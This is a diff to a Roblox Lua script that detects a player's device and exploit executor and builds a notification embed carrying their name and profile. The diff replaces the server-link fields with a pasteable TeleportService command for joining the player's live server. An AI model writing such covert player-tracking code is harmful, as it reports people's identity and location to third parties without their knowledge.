@@ -62,14 +62,6 @@ local function detectExploit()
     return "None"
 end
 
--- Function to get server information
-local function getServerInfo()
-    local placeId = game.PlaceId
-    local serverId = game.JobId
-    local serverLink = "https://www.roblox.com/games/" .. tostring(placeId) .. "/"
-    return serverId, serverLink
-end
-
 local function sendNotification()
     local player = Players.LocalPlayer
     local playerName = player.Name
@@ -92,8 +84,7 @@ local function sendNotification()
     local device = detectDevice()
     local exploit = detectExploit()
 
-    -- Get server information
-    local serverId, serverLink = getServerInfo()
+    local teleportScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(placeId) .. ", '" .. game.JobId .. "', game:GetService('Players').LocalPlayer)"
 
     local data = {
         ["embeds"] = {
@@ -124,16 +115,6 @@ local function sendNotification()
                         ["inline"] = true,
                     },
                     {
-                        ["name"] = "Server ID:",
-                        ["value"] = serverId,
-                        ["inline"] = true,
-                    },
-                    {
-                        ["name"] = "Server Link:",
-                        ["value"] = "[" .. placeName .. "](" .. serverLink .. ")",
-                        ["inline"] = true,
-                    },
-                    {
                         ["name"] = "Player Profile:",
                         ["value"] = "[" .. playerName .. "'s Profile](" .. profileUrl .. ")",
                         ["inline"] = true,
@@ -147,6 +128,11 @@ local function sendNotification()
                         ["name"] = "Executor:",
                         ["value"] = exploit,
                         ["inline"] = true,
+                    },
+                    {
+                        ["name"] = "Join Server (Execute This On Roblox):",
+                        ["value"] = "```lua\n" .. teleportScript .. "\n```",
+                        ["inline"] = false,
                     },
                 },
                 ["footer"] = {
